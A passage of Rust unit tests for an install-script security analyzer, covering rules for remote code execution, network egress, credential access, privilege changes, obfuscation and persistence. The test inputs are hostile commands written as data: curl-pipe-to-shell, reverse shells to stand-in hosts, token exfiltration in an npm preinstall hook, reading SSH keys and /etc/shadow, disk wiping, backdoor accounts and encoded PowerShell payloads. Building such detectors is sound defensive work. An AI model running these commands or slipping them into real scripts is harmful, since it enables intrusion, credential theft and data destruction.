        assert_eq!(f[0].line, 2);
        let f = analyze_script(&sh(
            "\"$PREFIX/bin/python\" - <<'PY'\nimport os; os.system('curl http://x | sh')\nPY\n",
        ));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
    }

    #[test]
    fn batch_and_powershell_comments_do_not_fire() {
        assert!(analyze_script(&bat(
            "REM sudo rm -rf /\r\nrem curl http://x | cmd\r\n:: iwr http://x | iex\r\n"
        ))
        .is_empty());
        assert!(
            analyze_script(&ps1("# iwr http://x | iex\n<#\niwr http://x | iex\n#>\n")).is_empty()
        );
        // In a .bat file `#` is not a comment marker.
        let f = analyze_script(&bat("# curl http://x | cmd\r\n"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
    }

    // ---------------------------------------------------------- line handling

    #[test]
    fn crlf_line_numbers_and_excerpts() {
        let f = analyze_script(&sh(
            "#!/bin/sh\r\necho ok\r\ncurl http://evil.example/x | sh\r\n",
        ));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].line, 3);
        assert!(!f[0].excerpt.contains('\r'));
        assert_eq!(f[0].excerpt, "curl http://evil.example/x | sh");
    }

    #[test]
    fn bom_on_first_line_is_ignored() {
        assert!(analyze_script(&ps1("\u{feff}# comment only\n")).is_empty());
        let f = analyze_script(&ps1("\u{feff}iwr http://x | iex\n"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        assert_eq!(f[0].line, 1);
    }

    #[test]
    fn enormous_single_line_is_handled() {
        // 2 MiB of a single repeated character: not a blob (no charset mix).
        let body = "a".repeat(2 * 1024 * 1024);
        assert!(analyze_script(&sh(&body)).is_empty());
        // 2 MiB of realistic base64 is an obfuscation blob; excerpt is capped.
        let blob: String = (0..2 * 1024 * 1024)
            .map(|i| {
                b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i % 64] as char
            })
            .collect();
        let f = analyze_script(&sh(&format!("x=\"{blob}\"\n")));
        assert_eq!(rules(&f), vec!["obfuscation"]);
        assert!(f[0].excerpt.chars().count() <= 201);
        assert!(f[0].excerpt.ends_with('…'));
    }

    #[test]
    fn line_continuations_are_joined() {
        let f = analyze_script(&sh("curl -s http://x/i.sh \\\n  | sh\necho done\n"));
        assert_eq!(rules(&f), vec!["remote-code-execution"]);
        assert_eq!(f[0].line, 1);
        let f = analyze_script(&sh("echo x \\\n  > ~/.foo\n"));
        assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
        // An escaped backslash is not a continuation.
        let f = analyze_script(&sh("echo 'a\\\\'\ncurl http://x | sh\n"));
        assert_eq!(f[0].line, 2);
        // Trailing continuation at EOF still gets analyzed.
        let f = analyze_script(&sh("curl http://x | sh \\"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        let f = analyze_script(&ps1("iwr http://x `\n  | iex\n"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        let f = analyze_script(&bat("curl http://x ^\r\n  | cmd\r\n"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
    }

    #[test]
    fn destructive_writes_are_high() {
        for line in [
            "rm -rf /",
            "rm -rf --no-preserve-root /",
            "rm -rf ~",
            "rm -rf \"$HOME/.cache/foo\"",
            "rm -r /usr/local/lib/foo",
            "dd if=/dev/zero of=/dev/sda bs=1M",
            "cat x > /dev/nvme0n1",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "writes-outside-prefix", ScriptSeverity::High);
        }
        let f = analyze_script(&ps1(
            "Remove-Item -Recurse -Force \"$env:USERPROFILE\\Documents\"\n",
        ));
        assert_rule(&f, "writes-outside-prefix", ScriptSeverity::High);
        let f = analyze_script(&bat("rd /s /q \"%USERPROFILE%\\Documents\"\r\n"));
        assert_rule(&f, "writes-outside-prefix", ScriptSeverity::High);
        // Non-recursive or inside the prefix stays as before.
        let f = analyze_script(&sh("rm -f ~/.foo\n"));
        assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
        assert_no_rule(
            &analyze_script(&sh("rm -rf \"$PREFIX/share/foo\"\n")),
            "writes-outside-prefix",
        );
    }

    #[test]
    fn evasion_tricks_that_are_caught() {
        let f = analyze_script(&sh("$(printf \"\\143\\165\\162\\154\") http://x | sh\n"));
        assert_rule(&f, "obfuscation", ScriptSeverity::High);
        let f = analyze_script(&sh("cu\"\"rl -s http://x/i.sh | sh\n"));
        assert_rule(&f, "obfuscation", ScriptSeverity::Medium);
        let f = analyze_script(&ps1("& ([scriptblock]::Create($s))\n"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        let f = analyze_script(&sh("tar czf - ~/.ssh | mail -s k a@b.c\n"));
        assert_rule(&f, "network-egress", ScriptSeverity::Medium);
        assert_rule(&f, "credential-access", ScriptSeverity::High);
        // Quote splicing is a shell trick; PowerShell uses "" as an escaped quote.
        assert_no_rule(
            &analyze_script(&ps1("Write-Host \"say \"\"hi\"\" now\"\n")),
            "obfuscation",
        );
    }

    #[test]
    fn output_is_deterministic_and_line_ordered() {
        let body = "sudo true\ncurl http://x/a | sh\nmkdir -p ~/.foo\necho x >> ~/.bashrc\n";
        let a = analyze_script(&sh(body));
        let b = analyze_script(&sh(body));
        assert_eq!(a, b);
        let lines: Vec<u32> = a.iter().map(|f| f.line).collect();
        let mut sorted = lines.clone();
        sorted.sort();
        assert_eq!(lines, sorted);
        assert_eq!(lines, vec![1, 2, 3, 4]);
    }

    #[test]
    fn one_finding_per_rule_per_line() {
        let f = analyze_script(&sh("mkdir -p ~/.a ~/.b /etc/foo\n"));
        assert_eq!(rules(&f), vec!["writes-outside-prefix"]);
    }

    #[test]
    fn serde_roundtrip() {
        let f = ScriptFinding {
            rule: "x".into(),
            severity: ScriptSeverity::High,
            line: 3,
            excerpt: "e".into(),
            explanation: "why".into(),
        };
        let json = serde_json::to_string(&f).unwrap();
        assert_eq!(serde_json::from_str::<ScriptFinding>(&json).unwrap(), f);
        let s = sh("echo\n");
        let json = serde_json::to_string(&s).unwrap();
        assert_eq!(serde_json::from_str::<InstallScript>(&json).unwrap(), s);
        assert!(ScriptSeverity::High > ScriptSeverity::Medium);
        assert!(ScriptSeverity::Medium > ScriptSeverity::Low);
        assert!(ScriptSeverity::Low > ScriptSeverity::Info);
    }

    // ------------------------------------------------ remote-code-execution

    #[test]
    fn rce_pipe_download_into_interpreter() {
        for line in [
            "curl -fsSL https://example.com/install.sh | sh",
            "curl -s http://x/y | sudo bash -s -- --yes",
            "wget -qO- https://x/y | bash",
            "wget -O - http://x | tar xz | sh",
            "curl http://x | python3 -",
            "bash -c \"$(curl -fsSL https://x/install.sh)\"",
            "sh <(curl -s https://x/i.sh)",
            ". <(wget -qO- https://x/i.sh)",
            "eval \"$(curl -s https://x/env.sh)\"",
            "source <(curl https://x)",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
            // The generic egress rule is suppressed when RCE fires on the line.
            assert_no_rule(&f, "network-egress");
        }
    }

    #[test]
    fn rce_powershell_and_batch() {
        for line in [
            "iwr https://x/a.ps1 | iex",
            "Invoke-WebRequest -Uri https://x/a.ps1 -UseBasicParsing | Invoke-Expression",
            "IEX (New-Object Net.WebClient).DownloadString('https://x/a.ps1')",
            "Invoke-Expression $payload",
            "iex(irm https://x/a)",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        }
        let f = analyze_script(&bat(
            "powershell -c \"iwr http://x/a.ps1 | iex\"\r\ncurl http://x/a.bat | cmd\r\n",
        ));
        assert_eq!(
            f.iter()
                .filter(|f| f.rule == "remote-code-execution")
                .count(),
            2
        );
    }

    #[test]
    fn rce_python_inline_fetch_and_exec() {
        let f = analyze_script(&sh(
            "python -c \"import urllib.request as u; exec(u.urlopen('http://x').read())\"\n",
        ));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
    }

    // ------------------------------------------------------- network-egress

    #[test]
    fn egress_tools_and_primitives() {
        for line in [
            "curl -o \"$PREFIX/share/model.bin\" https://models.example.com/m.bin",
            "wget https://x/y.tar.gz -O \"$PREFIX/y.tar.gz\"",
            "nc evil.example 4444 -e /bin/sh",
            "$PREFIX/bin/curl https://x",
            "  ncat --ssl x 443",
            "exec 3<>/dev/tcp/10.0.0.1/4444",
            "scp \"$PREFIX/etc/foo\" user@host:/tmp/",
            "git clone https://github.com/x/y \"$PREFIX/share/y\"",
            "\"$PREFIX/bin/pip\" install requests",
            "python -m pip install --no-deps foo",
            "npm install -g something",
            "conda install -y -p $PREFIX foo",
            "python -c \"import urllib.request; urllib.request.urlretrieve('http://x', 'y')\"",
            "bash -c 'exec 5<>/dev/tcp/1.2.3.4/80'",
            "echo hi | nc 203.0.113.9:4444",
            "curl http://203.0.113.9/x -o y",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "network-egress", ScriptSeverity::Medium);
        }
        for line in [
            "Invoke-WebRequest -Uri https://x/y -OutFile \"$env:PREFIX\\y\"",
            "$c = New-Object System.Net.WebClient; $c.DownloadFile('https://x/y', 'y')",
            "Start-BitsTransfer -Source https://x/y -Destination y",
            "certutil -urlcache -split -f http://x/y y",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "network-egress", ScriptSeverity::Medium);
        }
    }

    #[test]
    fn egress_does_not_fire_on_urls_in_messages_or_loopback() {
        for line in [
            "echo \"See https://docs.example.com/foo\"",
            "echo \"listening on 127.0.0.1:8080\"",
            "echo \"bind 0.0.0.0:80\" > \"$PREFIX/etc/foo.conf\"",
            "\"$PREFIX/bin/ssh-keygen\" -A",
            "rsync -a \"$PREFIX/a/\" \"$PREFIX/b/\"",
            "URL=https://example.com/docs",
            "\"$PREFIX/bin/python\" -m pip install --no-index --find-links \"$PREFIX/wheels\" foo",
            "pip install --no-deps --no-index \"$PREFIX/share/foo.whl\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_no_rule(&f, "network-egress");
        }
    }

    // ------------------------------------------------ writes-outside-prefix

    #[test]
    fn writes_outside_prefix_positive() {
        for line in [
            "mkdir -p ~/.foo",
            "mkdir -p \"$HOME/.config/foo\"",
            "mkdir -p ${HOME}/.foo",
            "cp \"$PREFIX/bin/foo\" /usr/local/bin/foo",
            "echo x > /etc/foo.conf",
            "echo x >> \"$HOME/.foo\"",
            "touch $HOME/.x",
            "rm -f /Library/Foo/x",
            "ln -sf \"$PREFIX/bin/foo\" /usr/bin/foo",
            "install -m 755 foo /opt/foo/bin/foo",
            "tee -a /etc/hosts < hosts.txt",
            "sed -i 's/a/b/' /etc/ld.so.conf",
            "chmod 644 ~/.foo",
            "cat > ~/.condarc-not-really-cred <<EOF",
            "\"$PREFIX/bin/jupyter\" kernelspec install --user \"$PREFIX/share/jupyter/kernels/foo\"",
            "defaults write com.apple.foo bar 1",
            "ldconfig",
            "dd if=\"$PREFIX/x\" of=/usr/lib/x",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
        }
        let f = analyze_script(&sh("update-ca-certificates\n"));
        assert_rule(&f, "writes-outside-prefix", ScriptSeverity::High);
        for line in [
            "copy \"%PREFIX%\\a\" \"%USERPROFILE%\\b\"",
            "echo x >> \"%APPDATA%\\foo\\x.txt\"",
            "xcopy /s \"%PREFIX%\\a\" \"C:\\Program Files\\Foo\"",
            "reg add HKCU\\Software\\Foo /v Bar /d 1",
            "mkdir \"%SystemRoot%\\Foo\"",
        ] {
            let f = analyze_script(&bat(&format!("{line}\r\n")));
            assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
        }
        for line in [
            "Copy-Item x \"$env:APPDATA\\y\"",
            "New-Item -ItemType Directory -Path \"$env:USERPROFILE\\.foo\"",
            "Set-Content -Path \"C:\\Windows\\foo.txt\" -Value x",
            "Set-ItemProperty -Path HKLM:\\Software\\Foo -Name Bar -Value 1",
            "\"x\" | Out-File ~\\foo.txt",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
        }
    }

    #[test]
    fn writes_inside_prefix_or_temp_are_silent() {
        for line in [
            "mkdir -p \"$PREFIX/etc/foo\"",
            "mkdir -p ${PREFIX}/etc/foo",
            "mkdir -p \"$CONDA_PREFIX/etc\" \"$SP_DIR/x\"",
            "echo x > /dev/null 2>&1",
            "echo x 2>&1 >/dev/null",
            "echo x >&2",
            "echo x > /tmp/foo.log",
            "echo x > \"$TMPDIR/foo\"",
            "echo x > ${TMPDIR:-/tmp}/foo",
            "cp /etc/foo \"$PREFIX/etc/foo\"",
            "[[ $a > $b ]] && echo yes",
            "if (( x > 5 )); then echo big; fi",
            "echo \"<b>bold</b> a -> b\"",
            "rm -rf build/ dist/",
            "touch stamp",
            "cat /etc/os-release",
            "cd /usr/share",
            "sed -i 's/a/b/' \"$PREFIX/etc/x\"",
            "ln -s ~/.foo \"$PREFIX/etc/foo-link\"",
            "cp -r /usr/share/foo \"$PREFIX/share/foo\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_no_rule(&f, "writes-outside-prefix");
        }
        for line in [
            "copy \"%PREFIX%\\a\" \"%PREFIX%\\b\" >nul",
            "echo x > \"%TEMP%\\x.txt\"",
            "mkdir \"%PREFIX%\\etc\"",
            "del /q \"%PREFIX%\\x\"",
        ] {
            let f = analyze_script(&bat(&format!("{line}\r\n")));
            assert_no_rule(&f, "writes-outside-prefix");
        }
        for line in [
            "Copy-Item \"$env:PREFIX\\a\" \"$env:PREFIX\\b\"",
            "New-Item -ItemType Directory -Path \"$env:TEMP\\x\"",
            "Set-Content -Path (Join-Path $env:PREFIX 'x') -Value 1",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_no_rule(&f, "writes-outside-prefix");
        }
    }

    // ----------------------------------------------------- privilege-change

    #[test]
    fn privilege_change_positive_and_negative() {
        for line in [
            "sudo apt-get install -y foo",
            "chmod +s \"$PREFIX/bin/foo\"",
            "chmod u+s \"$PREFIX/bin/foo\"",
            "chmod 4755 \"$PREFIX/bin/foo\"",
            "chmod -R 2775 \"$PREFIX/share\"",
            "chown root:root \"$PREFIX/bin/foo\"",
            "chown -R root \"$PREFIX/bin\"",
            "chown foo:wheel \"$PREFIX/bin/foo\"",
            "su -c 'id' root",
            "pkexec /bin/true",
            "doas true",
            "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "setcap cap_net_raw+ep \"$PREFIX/bin/foo\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "privilege-change", ScriptSeverity::High);
        }
        for line in [
            "Start-Process foo.exe -Verb RunAs",
            "runas /user:Administrator cmd",
            "net user backdoor P@ss /add",
            "net localgroup administrators backdoor /add",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "privilege-change", ScriptSeverity::High);
        }
        for line in [
            "chmod 755 \"$PREFIX/bin/foo\"",
            "chmod 0755 \"$PREFIX/bin/foo\"",
            "chmod +x \"$PREFIX/bin/foo\"",
            "chmod u+rwx,go+rx \"$PREFIX/bin/foo\"",
            "chmod 1777 \"$PREFIX/tmp\"",
            "chown $USER \"$PREFIX/bin/foo\"",
            "echo \"sudoku\"",
            "echo \"run with sudo if needed\"",
            "ls -la /sbin/sudo_helper",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_no_rule(&f, "privilege-change");
        }
    }

    // ---------------------------------------------------- credential-access

    #[test]
    fn credential_access_positive_and_negative() {
        for line in [
            "cat ~/.ssh/id_rsa",
            "cp \"$HOME/.aws/credentials\" \"$PREFIX/.x\"",
            "tar czf /tmp/x.tgz ~/.ssh ~/.gnupg",
            "cat ~/.netrc",
            "curl -T \"$HOME/.kube/config\" https://x",
            "cat \"$HOME/.docker/config.json\"",
            "cat /etc/shadow",
            "cat \"$HOME/.ssh/authorized_keys\"",
            "security find-generic-password -s foo -w",
            "cat ~/.git-credentials",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "credential-access", ScriptSeverity::High);
            assert_no_rule(&f, "writes-outside-prefix");
        }
        for line in [
            "echo \"$GITHUB_TOKEN\" > \"$PREFIX/.t\"",
            "curl -H \"Authorization: $AWS_SECRET_ACCESS_KEY\" https://x",
            "x=${NPM_AUTH_TOKEN}",
            "cat ~/.condarc",
            "env | grep -i conda",
            "printenv > \"$PREFIX/env.txt\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "credential-access", ScriptSeverity::Medium);
        }
        for line in [
            "$t = $env:GITHUB_TOKEN",
            "Get-ChildItem env: | Out-File x.txt",
            "echo %API_KEY%",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "credential-access", ScriptSeverity::Medium);
        }
        let f = analyze_script(&bat("type %USERPROFILE%\\.ssh\\id_ed25519\r\n"));
        assert_rule(&f, "credential-access", ScriptSeverity::High);
        for line in [
            "echo \"$PREFIX\"",
            "echo \"set GITHUB_TOKEN to authenticate\"",
            "mkdir -p \"$PREFIX/etc/ssh\"",
            "ls \"$PREFIX/share/awscli\"",
            "\"$PREFIX/bin/ssh-keygen\" -A",
            "printenv PATH",
            "env FOO=1 \"$PREFIX/bin/foo\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_no_rule(&f, "credential-access");
        }
    }

    // ----------------------------------------------------------- obfuscation

    #[test]
    fn obfuscation_positive_and_negative() {
        for line in [
            "echo aGVsbG8K | base64 -d | bash",
            "echo aGVsbG8K | base64 --decode | sh",
            "bash -c \"$(echo aGVsbG8K | base64 -d)\"",
            "eval \"$(echo aGVsbG8K | base64 -d)\"",
            "eval \"$(printf '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70')\"",
            "printf '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x78\\x2f\\x79\\x20\\x7c\\x20\\x73\\x68' | sh",
            "echo 68656c6c6f | xxd -r -p | sh",
            "zcat \"$PREFIX/share/blob.gz\" | bash",
            "python -c \"import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "obfuscation", ScriptSeverity::High);
        }
        let blob: String = (0..300)
            .map(|i| b"QWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"[i % 48] as char)
            .collect();
        let f = analyze_script(&sh(&format!("PAYLOAD=\"{blob}\"\n")));
        assert_rule(&f, "obfuscation", ScriptSeverity::High);
        for line in [
            "powershell -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)))",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "obfuscation", ScriptSeverity::High);
        }
        // eval of a dynamic string without a decoder is only Medium.
        let f = analyze_script(&sh("eval \"$cmd\"\n"));
        assert_rule(&f, "obfuscation", ScriptSeverity::Medium);
        let f = analyze_script(&sh("echo aGVsbG8K | base64 -d > \"$PREFIX/share/blob\"\n"));
        assert_rule(&f, "obfuscation", ScriptSeverity::Medium);
        let f = analyze_script(&bat("certutil -decode payload.b64 payload.exe\r\n"));
        assert_rule(&f, "obfuscation", ScriptSeverity::Medium);
        for line in [
            "echo \"sha256: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\"",
            "base64 \"$PREFIX/share/logo.png\" > \"$PREFIX/share/logo.b64\"",
            "printf '%s\\n' \"a\\tb\"",
            "echo \"evaluation complete\"",
            "x=\"$(cat \"$PREFIX/lib/python3.11/site-packages/somepackage/subpackage/anothersubpackage/yetanothersubpackage/deeper/module/file.txt\")\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_no_rule(&f, "obfuscation");
        }
    }

    // ------------------------------------------------------------ persistence

    #[test]
    fn persistence_positive_and_negative() {
        for line in [
            "(crontab -l; echo '* * * * * /x') | crontab -",
            "echo '* * * * * /x' > /etc/cron.d/foo",
            "cp foo.service /etc/systemd/system/foo.service",
            "systemctl enable foo",
            "systemctl --user enable foo",
            "echo 'source x' >> ~/.bashrc",
            "echo 'export X=1' >> \"$HOME/.zshrc\"",
            "cat >> ~/.profile <<EOF",
            "echo x >> /etc/profile.d/foo.sh",
            "cp foo.plist ~/Library/LaunchAgents/com.foo.plist",
            "launchctl load /Library/LaunchDaemons/com.foo.plist",
            "echo /x > /etc/ld.so.preload",
            "update-rc.d foo defaults",
            "nohup \"$PREFIX/bin/agent\" &",
            "cp foo.desktop ~/.config/autostart/",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "persistence", ScriptSeverity::Medium);
            assert_no_rule(&f, "writes-outside-prefix");
        }
        for line in [
            "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name foo -Value x",
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v foo /d x",
            "schtasks /create /tn foo /tr x /sc onlogon",
            "Register-ScheduledTask -TaskName foo -Action $a",
            "New-Service -Name foo -BinaryPathName x",
            "sc create foo binPath= x",
            "Copy-Item foo.lnk \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
            "Add-Content $PROFILE 'foo'",
        ] {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            assert_rule(&f, "persistence", ScriptSeverity::Medium);
        }
        for line in [
            "crontab -l",
            "source ~/.bashrc",
            "systemctl --version",
            "echo 'add to your ~/.bashrc: export FOO=1' >> \"$PREFIX/.messages.txt\"",
            "cp \"$PREFIX/share/foo.service\" \"$PREFIX/lib/systemd/user/foo.service\"",
            "echo \"nohup is not used\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_no_rule(&f, "persistence");
        }
    }

    // -------------------------------------------------- nested interpreters

    /// The npm hook this module used to miss completely. JavaScript inside
    /// `node -e` is not shell, so not one of the shell rules could see it.
    #[test]
    fn nested_node_eval_exfiltrating_npm_token_is_caught() {
        let s = make_inline_script(
            ScriptKind::PreInstall,
            "package.json#scripts.preinstall",
            "node -e \"require('https').get('https://exfil.invalid/?t='+process.env.NPM_TOKEN)\"\n",
        );
        let f = analyze_script(&s);
        assert_eq!(rules(&f), vec!["network-egress", "credential-access"]);
        assert_rule(&f, "network-egress", ScriptSeverity::Medium);
        assert_rule(&f, "credential-access", ScriptSeverity::Medium);
        assert_eq!(f[0].line, 1);
    }

    #[test]
    fn nested_network_egress_per_language() {
        for line in [
            "node -e \"require('http').request({host:'x.invalid'}).end()\"",
            "node --eval 'fetch(\"https://x.invalid/a\")'",
            "node -p \"require('https').get(u)\"",
            "python3 -c \"import urllib.request; urllib.request.urlopen('http://x.invalid')\"",
            "python -c 'import requests; requests.post(\"http://x.invalid\", data=d)'",
            "python -c 'import socket; socket.socket().connect((h, 4444))'",
            "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"http://x.invalid\"))'",
            "ruby -e 'require \"open-uri\"; URI.open(\"http://x.invalid\").read'",
            "perl -e 'use LWP::Simple; get(\"http://x.invalid\");'",
            "php -r 'echo file_get_contents(\"http://x.invalid\");'",
            "php -r '$c = curl_init(\"http://x.invalid\");'",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "network-egress", ScriptSeverity::Medium);
        }
    }

    #[test]
    fn nested_credential_access_per_language() {
        for line in [
            "node -e \"console.error(process.env.AWS_SECRET_ACCESS_KEY)\"",
            "node -e 'send(process.env[\"NPM_TOKEN\"])'",
            "node -e \"send(JSON.stringify(process.env))\"",
            "python -c \"import os; send(os.environ['GITHUB_TOKEN'])\"",
            "python3 -c 'import os; send(os.getenv(\"API_KEY\"))'",
            "ruby -e 'send(ENV[\"GEM_HOST_API_KEY\"])'",
            "perl -e 'send($ENV{\"CI_JOB_TOKEN\"});'",
            "php -r 'send($_ENV[\"DB_PASSWORD\"]);'",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "credential-access", ScriptSeverity::Medium);
        }
    }

    #[test]
    fn nested_remote_code_execution_per_language() {
        for line in [
            "node -e \"require('child_process').execSync('curl http://x.invalid | sh')\"",
            "node -e 'new Function(payload)()'",
            "node -e \"require('vm').runInNewContext(payload)\"",
            "python -c \"import os; os.system('id')\"",
            "python3 -c 'import subprocess; subprocess.Popen([\"id\"])'",
            "python -c \"exec(payload)\"",
            "ruby -e 'system(\"id\")'",
            "ruby -e 'puts `id`'",
            "perl -e 'exec(\"id\")'",
            "perl -e 'my $o = `id`; print $o;'",
            "php -r 'shell_exec(\"id\");'",
            "php -r 'passthru($_GET[\"c\"]);'",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        }
    }

    #[test]
    fn nested_filesystem_writes_outside_prefix() {
        for line in [
            "node -e \"require('fs').writeFileSync('~/.config/foo/x', p)\"",
            "node -e \"require('fs').appendFileSync('/usr/local/etc/x.conf', p)\"",
            "node -e \"require('fs').createWriteStream('/opt/foo/x')\"",
            "python -c \"open(os.path.expanduser('~/.local/x'), 'a').write(k)\"",
            "python3 -c \"open('/opt/foo/x', 'w').write(j)\"",
            "python3 -c \"Path('/usr/local/share/x').write_text(j)\"",
            "ruby -e 'File.write(\"/usr/lib/x\", p)'",
            "php -r 'file_put_contents(\"/etc/foo.conf\", $p);'",
            "perl -e 'open(FH, \">/etc/foo.conf\");'",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
        }
    }

    #[test]
    fn nested_shell_in_shell_recurses_through_the_same_engine() {
        // Two levels down: neither the outer nor the middle line matches on
        // its own, because `curl` is never at the start of a command there.
        let f = analyze_script(&sh(
            "sh -c 'sh -c \"curl -o /tmp/x http://evil.invalid/y\"'\n",
        ));
        assert_rule(&f, "network-egress", ScriptSeverity::Medium);
        let f = analyze_script(&sh("bash -c 'sh -c \"chmod +s /tmp/x\"'\n"));
        assert_rule(&f, "privilege-change", ScriptSeverity::High);
        // Message text stays inert at every level: the nested line is
        // masked by the same rule as a top-level one.
        assert!(analyze_script(&sh("sh -c 'echo \"python -c exec(p)\"'\n")).is_empty());
    }

    #[test]
    fn nested_quoting_variants_are_unwrapped() {
        for line in [
            "node -e \"require('child_process').execSync(cmd)\"",
            "node -e 'require(\"child_process\").execSync(cmd)'",
            "node -e require\\(\\'child_process\\'\\).execSync\\(cmd\\)",
            "sudo node -e \"require('child_process').execSync(cmd)\"",
            "FOO=1 node -e \"require('child_process').execSync(cmd)\"",
            "/usr/local/bin/node --eval \"require('child_process').execSync(cmd)\"",
            "true && node -e \"require('child_process').execSync(cmd)\"",
            "python -W ignore -c \"import os; os.system('id')\"",
            "python -Bc \"import os; os.system('id')\"",
        ] {
            let f = analyze_script(&sh(&format!("{line}\n")));
            assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        }
    }

    #[test]
    fn nested_powershell_command_and_encoded_command() {
        let f = analyze_script(&ps1(
            "powershell -NoProfile -Command \"iwr http://x.invalid/a.ps1 | iex\"\n",
        ));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        // -EncodedCommand is base64 over UTF-16LE. Decoding it exposes the
        // command the flag exists to hide, instead of only noting that
        // something is hidden.
        use base64::Engine as _;
        let inner = "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/a')";
        let bytes: Vec<u8> = inner.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
        let f = analyze_script(&ps1(&format!("powershell -enc {encoded}\n")));
        assert_rule(&f, "obfuscation", ScriptSeverity::High);
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
        // Undecodable junk after -enc must not panic or invent a finding.
        let f = analyze_script(&ps1("powershell -enc ????\n"));
        assert_no_rule(&f, "remote-code-execution");
    }

    #[test]
    fn nested_heredoc_body_gets_the_embedded_rules() {
        let f = analyze_script(&sh(
            "\"$PREFIX/bin/python\" - <<'PY'\nsend(os.environ['NPM_TOKEN'])\nPY\n",
        ));
        assert_rule(&f, "credential-access", ScriptSeverity::Medium);
        assert_eq!(f[0].line, 2);
        // A non-executable here-doc is still just text.
        assert!(
            analyze_script(&sh("cat > x <<'PY'\nsend(os.environ['NPM_TOKEN'])\nPY\n")).is_empty()
        );
    }

    #[test]
    fn nested_recursion_is_depth_bounded_and_terminates() {
        let payload = "curl -o /tmp/x http://evil.invalid/y";
        // At the depth limit the innermost command is still reached.
        let ok = format!("{}{payload}", "sh -c ".repeat(MAX_NEST_DEPTH));
        assert_rule(
            &analyze_script(&sh(&format!("{ok}\n"))),
            "network-egress",
            ScriptSeverity::Medium,
        );
        // Past it, nothing is reported. This is the documented bound, not a
        // rule failure: deeper nesting than this evades the module.
        let deep = format!("{}{payload}", "sh -c ".repeat(MAX_NEST_DEPTH + 2));
        assert!(analyze_script(&sh(&format!("{deep}\n"))).is_empty());
        // Adversarial input: extreme nesting and an enormous embedded body
        // must both terminate without blowing the stack.
        let huge = format!("{}{payload}", "sh -c ".repeat(50_000));
        let _ = analyze_script(&sh(&format!("{huge}\n")));
